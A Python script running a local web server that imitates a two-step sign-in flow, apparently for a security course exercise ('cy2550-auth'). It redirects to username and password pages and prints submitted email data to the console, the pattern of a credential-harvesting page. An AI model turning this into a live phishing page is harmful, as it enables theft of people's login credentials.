from http.server import HTTPServer, SimpleHTTPRequestHandler
import json

class LoginHandler(SimpleHTTPRequestHandler):

    def do_GET(self):
        print(f"Handling GET request for path: {self.path}")
        
        if self.path == '/' or self.path == '/cy2550-auth':
            self.send_response(302)
            self.send_header('Location', '/username.html')
            self.end_headers()
            return
            
        if '/cy2550-auth/' in self.path and '/auth' in self.path:
            try:
                with open('password.html', 'r', encoding='utf-8') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(content.encode())
            except FileNotFoundError:
                self.send_error(404, "Password page template not found")
            except Exception as e:
                self.send_error(500, f"Internal server error: {str(e)}")
            return
        
        return SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        print(f"Handling POST request for path: {self.path}")
        
        if self.path == '/cy2550-auth/post':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                print(f"Received POST data: {post_data}")
                print({post_data})
                
                # Parse JSON and store username
                data = json.loads(post_data)
                self.stored_username = data.get('email', '').strip()
                
                # Redirect to the password page
                self.send_response(302)
                self.send_header('Location', '/cy2550-auth/a8eec281-aaa3-4dae-ac9b-9a398b9215e7/auth')
                self.end_headers()
                return
                
            except json.JSONDecodeError:
                self.send_error(400, "Invalid JSON data")
                return
            except Exception as e:
                self.send_error(500, f"Internal server error: {str(e)}")
                return
            
        self.send_error(404, "Not Found")

def run_server():
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, LoginHandler)
    print('Server running on port 8000...')
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()